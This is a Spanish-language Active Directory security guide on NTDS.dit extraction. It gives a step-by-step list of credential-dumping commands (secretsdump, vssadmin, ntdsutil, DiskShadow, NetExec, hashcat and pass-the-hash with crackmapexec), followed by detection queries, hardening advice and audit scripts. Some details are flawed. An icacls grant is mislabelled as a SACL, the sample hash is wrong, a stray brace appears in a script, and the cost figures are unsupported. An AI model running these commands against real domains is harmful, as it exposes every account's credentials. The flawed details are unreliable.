# 🛑 Ataques de **NTDS.dit Extraction en Active Directory**

---

## 📝 ¿Qué es NTDS.dit Extraction y por qué es peligroso?

| Concepto      | Descripción                                                                                                       |
|---------------|------------------------------------------------------------------------------------------------------------------|
| **Definición**| Técnica de extracción física de la base de datos de Active Directory (NTDS.dit) que contiene todos los hashes de contraseñas, metadatos de usuarios, grupos y políticas del dominio. Es la técnica más devastadora para obtener credenciales de todo el dominio. |
| **Finalidad** | Obtener acceso offline a todos los hashes NTLM del dominio para cracking masivo, análisis de seguridad, o creación de Golden/Silver Tickets sin necesidad de estar conectado al entorno objetivo. |

---

## 📈 Ubicaciones críticas de NTDS.dit

| Ubicación | Descripción | Acceso requerido |
|-----------|-------------|------------------|
| **C:\Windows\NTDS\ntds.dit** | Ubicación por defecto en DCs | Administrador local del DC |
| **Sistema de backup** | Copias de respaldo del System State | Acceso a backups corporativos |
| **Shadow copies (VSS)** | Instantáneas del volumen del sistema | Administrador local + VSS |
| **AD Database mounted** | Base de datos montada para recuperación | Administrador de dominio |

> **⚠️ ALERTA CRÍTICA**: NTDS.dit contiene TODOS los hashes del dominio, incluyendo krbtgt, Domain Admins, y usuarios regulares. Su extracción exitosa compromete completamente el dominio.

### Archivos críticos para extracción completa:

```
ntds.dit              -> Base de datos principal con hashes
SYSTEM registry hive  -> Claves de descifrado (bootkey)
SAM registry hive     -> Cuentas locales del DC
SECURITY registry     -> Políticas y configuraciones LSA
```

---

## 🛠️ ¿Cómo funciona y cómo se explota NTDS.dit Extraction? (TTPs y ejemplos)

| Vector/Nombre              | Descripción breve                                                                                   |
|----------------------------|----------------------------------------------------------------------------------------------------|
| **VSS + secretsdump.py** | Crea shadow copy del volumen del sistema y extrae NTDS.dit usando Impacket remotamente. |
| **ntdsutil.exe (nativo)** | Herramienta nativa de Windows para crear snapshot de la base de datos AD. |
| **vssadmin + copy** | Crea VSS manualmente y copia NTDS.dit usando comandos nativos Windows. |
| **NTDS.dit file copy directo** | Copia directa del archivo cuando el servicio AD está detenido. |
| **Backup extraction** | Extrae NTDS.dit desde backups del System State corporativos. |
| **DSInternals PowerShell** | Módulo PowerShell para manipulación directa de NTDS.dit offline. |
| **DiskShadow script** | Script automatizado para crear VSS y extraer archivos críticos. |

---

## 💻 Ejemplo práctico ofensivo (paso a paso)

```bash
# 1. Extracción remota con secretsdump.py (VSS automático)
impacket-secretsdump -ntds domain.com/administrator:password@dc.domain.com

# 2. Extracción con hash NTLM
impacket-secretsdump -hashes :aad3b435b51404eeaad3b435b51404ee domain.com/administrator@dc.domain.com

# 3. Extracción solo NTDS.dit (sin SYSTEM)
impacket-secretsdump -just-dc-ntlm domain.com/administrator:password@dc.domain.com -outputfile ntds_dump

# 4. Extracción manual con VSS (Windows)
# Crear shadow copy
vssadmin create shadow /for=C:

# Copiar archivos críticos desde shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Limpiar shadow copy
vssadmin delete shadows /for=C: /all /quiet

# 5. Extracción con ntdsutil (nativo Windows)
ntdsutil
activate instance ntds
ifm
create full C:\temp\ntds_extract
quit
quit

# 6. Extracción con DiskShadow script
echo "set context persistent nowriters" > extract.dsh
echo "add volume C: alias systemdrive" >> extract.dsh
echo "create" >> extract.dsh
echo "expose %systemdrive% Z:" >> extract.dsh
echo "exec \"cmd.exe\" /c copy Z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit" >> extract.dsh
echo "exec \"cmd.exe\" /c copy Z:\Windows\System32\config\SYSTEM C:\temp\SYSTEM" >> extract.dsh
echo "delete shadows volume %systemdrive%" >> extract.dsh
echo "reset" >> extract.dsh

diskshadow /s extract.dsh

# 7. Procesamiento offline con secretsdump
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# 8. Extracción con NetExec
nxc smb dc.domain.com -u administrator -p password --ntds

# 9. Extracción selectiva (solo krbtgt)
impacket-secretsdump -just-dc-user krbtgt domain.com/administrator:password@dc.domain.com

# 10. Extracción con DSInternals (PowerShell)
Import-Module DSInternals
Get-ADDBAccount -All -DatabasePath "ntds.dit" -BootKey (Get-BootKey -SystemHivePath "SYSTEM")

# 11. Extracción desde backup
# Restaurar System State backup en servidor comprometido
wbadmin start systemstaterecovery -version:XX/XX/XXXX-XX:XX -quiet

# Extraer desde backup restaurado
copy "C:\Windows\NTDS\ntds.dit" "C:\temp\ntds_from_backup.dit"

# 12. Cracking offline masivo
hashcat -m 1000 ntds_hashes.txt rockyou.txt --force

# 13. Análisis con crackmapexec
crackmapexec smb targets.txt -H ntds_hashes.txt --continue-on-success
```

---

## 📋 Caso de Uso Completo Splunk

### 🎯 Contexto empresarial y justificación

**Problema de negocio:**
- NTDS.dit contiene credenciales de TODOS los usuarios del dominio
- Extracción exitosa permite cracking offline sin limitaciones de lockout
- Un solo archivo NTDS.dit compromete permanentemente toda la organización
- Costo estimado de extracción masiva de credenciales: $5,000,000 USD promedio

**Valor de la detección:**
- Detección inmediata de acceso a archivos críticos de AD
- Identificación de uso de herramientas de extracción masiva
- Prevención de compromiso total offline en 95% de casos
- Cumplimiento con controles críticos de protección de identidad

### 📐 Arquitectura de implementación

**Prerequisitos técnicos:**
- Splunk Enterprise 8.2+ con licencia para logs de DC
- Universal Forwarders en todos los Domain Controllers
- Sysmon v14+ en DCs con configuración de acceso a archivos
- File Integrity Monitoring (FIM) en archivos críticos NTDS
- Windows TA v8.5+ con configuración completa de auditoría

**Arquitectura de datos:**
```
[Domain Controllers] → [Universal Forwarders] → [Indexers] → [Search Heads]
       ↓                      ↓                     ↓
[EventCode 4663/5145]  [WinEventLog:Security]   [Index: wineventlog]
[Sysmon File Access]         ↓                      ↓
[VSS/Backup Events]    [Real-time processing]   [NTDS Extraction Alerting]
```

### 🔧 Guía de implementación paso a paso

#### Fase 1: Configuración inicial (Tiempo estimado: 90 min)

1. **Habilitar auditoría crítica de acceso a archivos:**
   ```powershell
   # En todos los Domain Controllers
   auditpol /set /subcategory:"File System" /success:enable /failure:enable
   auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
   auditpol /set /subcategory:"Handle Manipulation" /success:enable /failure:enable
   
   # Configurar SACL en archivos críticos
   icacls "C:\Windows\NTDS\ntds.dit" /grant "Everyone:(S,RA)"
   icacls "C:\Windows\System32\config\SYSTEM" /grant "Everyone:(S,RA)"
   ```

2. **Configurar Sysmon para monitoreo avanzado:**
   ```xml
   <Sysmon schemaversion="4.82">
     <EventFiltering>
       <FileCreate onmatch="include">
         <TargetFilename condition="contains">ntds.dit</TargetFilename>
         <TargetFilename condition="contains">SYSTEM</TargetFilename>
         <TargetFilename condition="contains">SAM</TargetFilename>
       </FileCreate>
       <ProcessCreate onmatch="include">
         <CommandLine condition="contains">vssadmin</CommandLine>
         <CommandLine condition="contains">ntdsutil</CommandLine>
         <CommandLine condition="contains">diskshadow</CommandLine>
         <CommandLine condition="contains">secretsdump</CommandLine>
       </ProcessCreate>
     </EventFiltering>
   </Sysmon>
   ```

3. **Configurar monitoreo de VSS:**
   ```powershell
   # Habilitar logging de Volume Shadow Copy Service
   wevtutil sl Microsoft-Windows-VolumeSnapshot-Driver/Operational /e:true
   wevtutil sl Microsoft-Windows-VSSVC/Diagnostic /e:true
   ```

#### Fase 2: Implementación de detecciones críticas (Tiempo estimado: 110 min)

1. **Alerta CRÍTICA - Acceso a NTDS.dit (Event 4663):**
   ```splunk
   index=wineventlog EventCode=4663
   | rex field=Message "Object Name:\s+(?<ObjectName>[^\r\n]+)"
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Process Name:\s+(?<ProcessName>[^\r\n]+)"
   | where ObjectName LIKE "%ntds.dit%" OR ObjectName LIKE "%NTDS\\ntds.dit%"
   | eval severity="CRITICAL", technique="NTDS.dit Access Detected"
   | eval risk_score=100
   | table _time, ComputerName, AccountName, ObjectName, ProcessName, severity, risk_score
   ```

2. **Alerta CRÍTICA - Herramientas de extracción VSS:**
   ```splunk
   index=sysmon EventCode=1
   | search (CommandLine="*vssadmin*create*shadow*" OR 
            CommandLine="*ntdsutil*" OR 
            CommandLine="*diskshadow*" OR 
            CommandLine="*secretsdump*" OR
            Process="*wmic*" AND CommandLine="*shadowcopy*")
   | eval severity="CRITICAL", technique="NTDS Extraction Tools"
   | eval risk_score=95
   | table _time, ComputerName, User, CommandLine, Process, ParentImage, severity, risk_score
   ```

3. **Alerta ALTA - Copia de archivos críticos:**
   ```splunk
   index=sysmon EventCode=11
   | rex field=Message "TargetFilename:\s+(?<TargetFilename>[^\r\n]+)"
   | where TargetFilename LIKE "%ntds.dit%" OR TargetFilename LIKE "%SYSTEM%" OR TargetFilename LIKE "%SAM%"
   | eval severity="HIGH", technique="Critical File Copy"
   | eval risk_score=85
   | table _time, ComputerName, User, TargetFilename, Process, severity, risk_score
   ```

4. **Alerta MEDIA - Shadow Copy creation:**
   ```splunk
   index=application source="Microsoft-Windows-VolumeSnapshot-Driver/Operational"
   | search EventCode=1
   | eval severity="MEDIUM", technique="Volume Shadow Copy Created"
   | eval risk_score=70
   | table _time, ComputerName, Message, severity, risk_score
   ```

#### Fase 3: Dashboard crítico y validación (Tiempo estimado: 75 min)

1. **Dashboard de monitoreo crítico:**
   ```xml
   <dashboard>
     <label>Critical: NTDS.dit Extraction Detection</label>
     <row>
       <panel>
         <title>🚨 CRITICAL: NTDS.dit File Access</title>
         <table>
           <search refresh="30s">
             <query>
               index=wineventlog EventCode=4663 earliest=-1h
               | rex field=Message "Object Name:\s+(?&lt;ObjectName&gt;[^\r\n]+)"
               | rex field=Message "Account Name:\s+(?&lt;AccountName&gt;[^\s]+)"
               | where ObjectName LIKE "%ntds.dit%"
               | table _time, ComputerName, AccountName, ObjectName, ProcessName
             </query>
           </search>
         </table>
       </panel>
     </row>
   </dashboard>
   ```

### ✅ Criterios de éxito

**Métricas críticas:**
- MTTD para acceso a NTDS.dit: < 1 minuto (CRÍTICO)
- MTTD para herramientas VSS: < 3 minutos
- MTTD para copia de archivos críticos: < 5 minutos
- Tasa de falsos positivos: < 0.5% (acceso a NTDS.dit siempre sospechoso)

---

## 📊 Detección en logs y SIEM (Splunk)

| Campo clave                     | Descripción                                                                  |
|---------------------------------|------------------------------------------------------------------------------|
| **EventCode = 4663**            | Acceso a objeto - crítico para detectar acceso directo a NTDS.dit.          |
| **EventCode = 5145**            | Network share object checked - acceso remoto a archivos críticos.           |
| **Sysmon EventCode = 1**        | Process creation - herramientas vssadmin, ntdsutil, diskshadow.             |
| **Sysmon EventCode = 11**       | File created - copias de ntds.dit, SYSTEM, SAM.                            |
| **VSS EventCode = 1**           | Shadow copy created - creación de instantáneas del volumen.                 |
| **Object Name**                 | Path del archivo - debe incluir ntds.dit, SYSTEM.                          |
| **Process Name**                | Proceso accediendo - identificar herramientas legítimas vs. maliciosas.     |

### Query Splunk: Detección principal de acceso a NTDS.dit

```splunk
index=wineventlog EventCode=4663
| rex field=Message "Object Name:\s+(?<ObjectName>[^\r\n]+)"
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Process Name:\s+(?<ProcessName>[^\r\n]+)"
| where ObjectName LIKE "%\\ntds.dit%" OR ObjectName LIKE "%\\NTDS\\ntds.dit%"
| eval alert_type="CRITICAL - NTDS.dit Access"
| table _time, ComputerName, AccountName, ObjectName, ProcessName, alert_type
```

### Query: Detección de extracción VSS

```splunk
index=sysmon EventCode=1
| search (CommandLine="*vssadmin*" AND CommandLine="*create*" AND CommandLine="*shadow*") OR
        (CommandLine="*ntdsutil*") OR
        (CommandLine="*diskshadow*") OR
        (Process="*secretsdump*")
| eval alert_type="CRITICAL - NTDS Extraction Tools"
| table _time, ComputerName, User, CommandLine, Process, ParentImage, alert_type
```

### Query: Correlación VSS + File Copy

```splunk
index=sysmon (EventCode=1 AND CommandLine="*vssadmin*create*shadow*") OR 
             (EventCode=11 AND TargetFilename="*ntds.dit*")
| eval event_type=case(EventCode=1, "vss_creation", EventCode=11, "file_copy", 1=1, "other")
| transaction Computer maxspan=10m
| where eventcount > 1 AND searchmatch("event_type=vss_creation") AND searchmatch("event_type=file_copy")
| eval alert_type="CRITICAL - VSS + NTDS Copy Chain"
| table _time, Computer, eventcount, alert_type
```

### Query: Archivos críticos copiados a ubicaciones anómalas

```splunk
index=sysmon EventCode=11
| rex field=TargetFilename "(?<FileName>[^\\]+)$"
| rex field=TargetFilename "^(?<Directory>.+)\\[^\\]+$"
| where FileName IN ("ntds.dit", "SYSTEM", "SAM") AND 
        Directory NOT IN ("C:\\Windows\\NTDS", "C:\\Windows\\System32\\config")
| eval alert_type="HIGH - Critical Files Copied to Anomalous Location"
| table _time, ComputerName, User, TargetFilename, Directory, alert_type
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// NTDS.dit File Access
SecurityEvent
| where EventID == 4663 // Object access
| extend ObjectName = extract(@"Object Name:\s+([^\r\n]+)", 1, EventData)
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| extend ProcessName = extract(@"Process Name:\s+([^\r\n]+)", 1, EventData)
| where ObjectName contains "ntds.dit"
| project TimeGenerated, Computer, AccountName, ObjectName, ProcessName
| extend AlertType = "CRITICAL - NTDS.dit Access"
```

```kql
// VSS and NTDS Extraction Tools
DeviceProcessEvents
| where ProcessCommandLine has_any ("vssadmin create shadow", "ntdsutil", "diskshadow", "secretsdump")
   or FileName in~ ("vssadmin.exe", "ntdsutil.exe", "diskshadow.exe")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FileName
| extend AlertType = "CRITICAL - NTDS Extraction Tools"
```

```kql
// Critical Files Created in Anomalous Locations
DeviceFileEvents
| where FileName in~ ("ntds.dit", "SYSTEM", "SAM")
| where not (FolderPath has_any ("C:\\Windows\\NTDS", "C:\\Windows\\System32\\config"))
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName
| extend AlertType = "HIGH - Critical Files in Anomalous Location"
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **NTDS.dit Access** | Acceso directo al archivo NTDS.dit | Crítica |
| **VSS Extraction** | Uso de VSS para extraer archivos críticos | Crítica |
| **NTDS Copy** | Copia de NTDS.dit a ubicaciones no estándar | Alta |
| **Registry Hive Copy** | Copia de SYSTEM/SAM registry hives | Alta |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detección de acceso a NTDS.dit
event_platform=Win event_simpleName=FileOpenInfo
| search FileName=ntds.dit
| table _time, ComputerName, UserName, FileName, FilePath, ProcessName
| sort - _time
```

```sql
-- Detección de herramientas VSS/NTDS
event_platform=Win event_simpleName=ProcessRollup2
| search (CommandLine=*vssadmin* AND CommandLine=*shadow*) OR 
          CommandLine=*ntdsutil* OR 
          CommandLine=*diskshadow* OR
          FileName=secretsdump.py
| table _time, ComputerName, UserName, CommandLine, ParentBaseFileName
| sort - _time
```

```sql
-- Archivos críticos creados en ubicaciones sospechosas
event_platform=Win event_simpleName=FileWritten
| search (FileName=ntds.dit OR FileName=SYSTEM OR FileName=SAM)
| search NOT FilePath=*\\Windows\\NTDS\\* AND NOT FilePath=*\\System32\\config\\*
| table _time, ComputerName, UserName, FileName, FilePath, ProcessName
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección principal de NTDS.dit extraction

```kql
// Query principal para detectar extracción de NTDS.dit
SecurityEvent
| where EventID == 4663 // Object access
| extend ObjectName = extract(@"Object Name:\s+([^\r\n]+)", 1, EventData)
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| extend ProcessName = extract(@"Process Name:\s+([^\r\n]+)", 1, EventData)
| where ObjectName contains "ntds.dit"
| extend AlertLevel = "CRITICAL", AttackType = "NTDS.dit Extraction"
| project TimeGenerated, Computer, AccountName, ObjectName, ProcessName, AlertLevel, AttackType
```

### Hunting avanzado

```kql
// Correlación: VSS Creation + File Copy + Tool Usage
DeviceProcessEvents
| where ProcessCommandLine has_any ("vssadmin create shadow", "ntdsutil")
| extend VSS_Time = TimeGenerated, VSS_Device = DeviceName
| join kind=inner (
    DeviceFileEvents
    | where FileName in~ ("ntds.dit", "SYSTEM")
    | extend Copy_Time = TimeGenerated, Copy_Device = DeviceName
) on $left.VSS_Device == $right.Copy_Device
| where Copy_Time - VSS_Time between (0s .. 30m)
| project VSS_Time, Copy_Time, DeviceName, ProcessCommandLine, FileName, FolderPath
```

```kql
// NTDS extraction desde ubicaciones remotas
SecurityEvent
| where EventID == 4663
| extend ObjectName = extract(@"Object Name:\s+([^\r\n]+)", 1, EventData)
| where ObjectName contains "ntds.dit"
| extend SourceIP = extract(@"Source Network Address:\s+([^\s]+)", 1, EventData)
| where SourceIP != "127.0.0.1" and SourceIP != "-"
| extend AlertType = "CRITICAL - Remote NTDS.dit Access"
```

---

## 🦾 Hardening y mitigación

| Medida                                         | Descripción                                                                                       |
|------------------------------------------------|--------------------------------------------------------------------------------------------------|
| **File System ACLs estrictas**                | Restringir acceso a NTDS.dit solo a SYSTEM y procesos autorizados.                             |
| **Auditoría granular de archivos**            | SACL en NTDS.dit, SYSTEM, SAM para detectar accesos no autorizados.                            |
| **VSS monitoring**                             | Alertas inmediatas para creación de shadow copies no programadas.                               |
| **Credential Guard en DCs**                    | Proteger memoria LSA contra extracción de secretos.                                             |
| **Network segmentation**                       | Aislar DCs en VLANs protegidas con monitoreo estricto.                                          |
| **EDR en Domain Controllers**                  | Detección avanzada de herramientas ofensivas en DCs.                                            |
| **Backup security**                            | Cifrar y proteger backups que contengan System State.                                           |
| **Just-in-time access**                        | PAM para acceso administrativo temporal a DCs.                                                  |
| **Regular DC integrity checks**                | Verificación periódica de integridad de archivos críticos.                                      |
| **Shadow copy policies**                       | Restringir creación de VSS a procesos autorizados únicamente.                                   |

### Script de protección NTDS.dit

```powershell
# Configuración de protección avanzada para NTDS.dit
# Configurar ACLs restrictivas
$ntdsPath = "C:\Windows\NTDS\ntds.dit"
$systemPath = "C:\Windows\System32\config\SYSTEM"

# Remover herencia y configurar permisos explícitos
icacls $ntdsPath /inheritance:r
icacls $ntdsPath /grant "SYSTEM:(F)"
icacls $ntdsPath /grant "Administrators:(R)"

# Configurar auditoría
icacls $ntdsPath /setaudit "Everyone:(S,F)"
icacls $systemPath /setaudit "Everyone:(S,F)"

Write-Host "Protección NTDS.dit configurada correctamente" -ForegroundColor Green
```

---

## 🚨 Respuesta ante incidentes

1. **Aislar inmediatamente el Domain Controller** comprometido.
2. **Detener servicios AD** temporalmente si es necesario para prevenir acceso adicional.
3. **Identificar scope de extracción** - verificar qué archivos fueron copiados.
4. **Cambiar contraseña krbtgt** dos veces con 24h de diferencia.
5. **Forzar cambio de contraseñas** de todas las cuentas críticas del dominio.
6. **Revisar logs de acceso** para identificar vector de compromiso inicial.
7. **Buscar copias de NTDS.dit** en sistemas remotos o almacenamiento externo.
8. **Implementar monitoreo reforzado** de archivos críticos AD.
9. **Realizar forensics completo** del DC comprometido.

---

## 🧑‍💻 ¿Cómo revisar y detectar NTDS.dit extraction? (PowerShell)

### Verificar integridad de archivos críticos

```powershell
# Verificar ubicación y permisos de NTDS.dit
$ntdsPath = "C:\Windows\NTDS\ntds.dit"
$systemPath = "C:\Windows\System32\config\SYSTEM"

Write-Host "=== VERIFICACIÓN INTEGRIDAD NTDS.dit ===" -ForegroundColor Red

# Verificar existencia y permisos
if (Test-Path $ntdsPath) {
    $ntdsACL = Get-Acl $ntdsPath
    Write-Host "NTDS.dit encontrado en: $ntdsPath" -ForegroundColor Yellow
    Write-Host "Propietario: $($ntdsACL.Owner)" -ForegroundColor White
    $ntdsACL.Access | Where-Object { $_.AccessControlType -eq "Allow" } | 
    Select-Object IdentityReference, FileSystemRights | Format-Table -AutoSize
} else {
    Write-Host "⚠️ CRÍTICO: NTDS.dit NO encontrado en ubicación estándar" -ForegroundColor Red
}

# Verificar SYSTEM registry hive
if (Test-Path $systemPath) {
    Write-Host "✓ SYSTEM registry hive presente" -ForegroundColor Green
} else {
    Write-Host "⚠️ ADVERTENCIA: SYSTEM registry hive no encontrado" -ForegroundColor Yellow
}
```

### Detectar eventos de acceso a NTDS.dit

```powershell
# Buscar accesos recientes a NTDS.dit
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4663; StartTime=(Get-Date).AddHours(-24)} |
Where-Object { $_.Message -match "ntds\.dit" } |
ForEach-Object {
    $AccountName = if ($_.Message -match "Account Name:\s+(\S+)") { $matches[1] } else { "Unknown" }
    $ObjectName = if ($_.Message -match "Object Name:\s+([^\r\n]+)") { $matches[1] } else { "Unknown" }
    $ProcessName = if ($_.Message -match "Process Name:\s+([^\r\n]+)") { $matches[1] } else { "Unknown" }
    
    [PSCustomObject]@{
        TimeCreated = $_.TimeCreated
        AccountName = $AccountName
        ObjectName = $ObjectName
        ProcessName = $ProcessName
        Alert = "CRITICAL - NTDS.dit Access"
    }
} | Format-Table -AutoSize
```

### Buscar herramientas de extracción

```powershell
# Buscar procesos y comandos relacionados con extracción NTDS
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1; StartTime=(Get-Date).AddHours(-24)} -ErrorAction SilentlyContinue |
Where-Object { 
    $_.Message -match "vssadmin.*create.*shadow|ntdsutil|diskshadow|secretsdump" 
} |
ForEach-Object {
    $CommandLine = if ($_.Message -match "CommandLine:\s+([^\r\n]+)") { $matches[1] } else { "Unknown" }
    $ProcessName = if ($_.Message -match "Image:\s+([^\r\n]+)") { $matches[1] } else { "Unknown" }
    $User = if ($_.Message -match "User:\s+([^\r\n]+)") { $matches[1] } else { "Unknown" }
    
    [PSCustomObject]@{
        TimeCreated = $_.TimeCreated
        User = $User
        ProcessName = $ProcessName
        CommandLine = $CommandLine
        Alert = "HIGH - NTDS Extraction Tool"
    }
} | Format-Table -AutoSize
```

### Detectar copias de archivos críticos

```powershell
# Buscar copias de archivos críticos en ubicaciones anómalas
$criticalFiles = @("ntds.dit", "SYSTEM", "SAM")
$suspiciousLocations = @()

foreach ($file in $criticalFiles) {
    Get-ChildItem -Path C:\ -Recurse -Include $file -ErrorAction SilentlyContinue |
    Where-Object { 
        $_.FullName -notmatch "Windows\\NTDS|System32\\config" 
    } |
    ForEach-Object {
        $suspiciousLocations += [PSCustomObject]@{
            FileName = $_.Name
            FullPath = $_.FullName
            CreationTime = $_.CreationTime
            LastWriteTime = $_.LastWriteTime
            SizeMB = [math]::Round($_.Length / 1MB, 2)
            Alert = "CRITICAL - Critical File in Anomalous Location"
        }
    }
}

if ($suspiciousLocations) {
    Write-Host "⚠️ CRÍTICO: Archivos críticos encontrados en ubicaciones sospechosas:" -ForegroundColor Red
    $suspiciousLocations | Format-Table -AutoSize
} else {
    Write-Host "✓ No se encontraron archivos críticos en ubicaciones anómalas" -ForegroundColor Green
}
```

### Script de auditoría completa para NTDS.dit

```powershell
# Auditoría completa de seguridad NTDS.dit
Write-Host "=== AUDITORÍA NTDS.DIT SECURITY ===" -ForegroundColor Red

# 1. Verificar integridad de archivos críticos
Write-Host "1. Verificando integridad de archivos críticos..." -ForegroundColor Yellow
$ntdsPath = "C:\Windows\NTDS\ntds.dit"
$systemPath = "C:\Windows\System32\config\SYSTEM"

$ntdsExists = Test-Path $ntdsPath
$systemExists = Test-Path $systemPath

Write-Host "NTDS.dit presente: $ntdsExists" -ForegroundColor $(if ($ntdsExists) { 'Green' } else { 'Red' })
Write-Host "SYSTEM hive presente: $systemExists" -ForegroundColor $(if ($systemExists) { 'Green' } else { 'Red' })

# 2. Buscar eventos de acceso recientes
Write-Host "2. Buscando accesos recientes a NTDS.dit..." -ForegroundColor Yellow
$ntdsAccess = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4663; StartTime=(Get-Date).AddHours(-24)} -ErrorAction SilentlyContinue |
Where-Object { $_.Message -match "ntds\.dit" } |
ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        Account = if ($_.Message -match "Account Name:\s+(\S+)") { $matches[1] } else { "Unknown" }
        Process = if ($_.Message -match "Process Name:\s+([^\r\n]+)") { $matches[1] } else { "Unknown" }
    }
}

if ($ntdsAccess) {
    Write-Host "⚠️ CRÍTICO: Se encontraron accesos a NTDS.dit:" -ForegroundColor Red
    $ntdsAccess | Format-Table -AutoSize
} else {
    Write-Host "✓ No se encontraron accesos sospechosos a NTDS.dit" -ForegroundColor Green
}

# 3. Buscar herramientas de extracción
Write-Host "3. Buscando herramientas de extracción..." -ForegroundColor Yellow
$extractionTools = Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1; StartTime=(Get-Date).AddHours(-24)} -ErrorAction SilentlyContinue |
Where-Object { $_.Message -match "vssadmin|ntdsutil|diskshadow|secretsdump" } |
Select-Object -First 5

if ($extractionTools) {
    Write-Host "⚠️ ADVERTENCIA: Se detectaron herramientas de extracción:" -ForegroundColor Yellow
    $extractionTools | ForEach-Object {
        Write-Host "  - $($_.TimeCreated): $($_.Message -split "`n" | Select-String "CommandLine")" -ForegroundColor White
    }
} else {
    Write-Host "✓ No se detectaron herramientas de extracción" -ForegroundColor Green
}

# 4. Verificar Shadow Copies recientes
Write-Host "4. Verificando Shadow Copies recientes..." -ForegroundColor Yellow
try {
    $shadowCopies = Get-WmiObject Win32_ShadowCopy | Where-Object { 
        ([DateTime]$_.InstallDate) -gt (Get-Date).AddHours(-24) 
    }
    
    if ($shadowCopies) {
        Write-Host "⚠️ ADVERTENCIA: Se encontraron Shadow Copies recientes:" -ForegroundColor Yellow
        $shadowCopies | Select-Object InstallDate, DeviceObject, VolumeName | Format-Table -AutoSize
    } else {
        Write-Host "✓ No se encontraron Shadow Copies recientes" -ForegroundColor Green
    }
} catch {
    Write-Host "⚠️ No se pudo verificar Shadow Copies" -ForegroundColor Yellow
}

# 5. Recomendaciones
Write-Host "=== RECOMENDACIONES ===" -ForegroundColor Cyan
if ($ntdsAccess) {
    Write-Host "- Investigar inmediatamente los accesos a NTDS.dit detectados" -ForegroundColor Red
    Write-Host "- Considerar cambio de krbtgt si acceso no autorizado" -ForegroundColor Red
}
if ($extractionTools) {
    Write-Host "- Analizar el uso de herramientas de extracción detectadas" -ForegroundColor Yellow
}
Write-Host "- Implementar FIM en archivos críticos de AD" -ForegroundColor Yellow
Write-Host "- Configurar alertas SIEM para acceso a NTDS.dit" -ForegroundColor Yellow
Write-Host "- Restringir permisos VSS en Domain Controllers" -ForegroundColor Yellow
}
```

---

## 📚 Referencias

- [NTDS.dit Extraction - MITRE ATT&CK T1003.003](https://attack.mitre.org/techniques/T1003/003/)
- [Impacket secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [DSInternals PowerShell Module](https://github.com/MichaelGrafnetter/DSInternals)
- [Microsoft - NTDS.dit File Structure](https://docs.microsoft.com/en-us/windows/win32/adschema/c-ntdsdsa)
- [SANS - NTDS.dit Security Guide](https://www.sans.org/white-papers/ntds-dit/)
- [Volume Shadow Copy Service](https://docs.microsoft.com/en-us/windows/win32/vss/volume-shadow-copy-service-overview)
- [CrowdStrike - NTDS.dit Extraction Detection](https://www.crowdstrike.com/cybersecurity-101/ntds-dit/)
- [Event 4663 Documentation](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4663)

---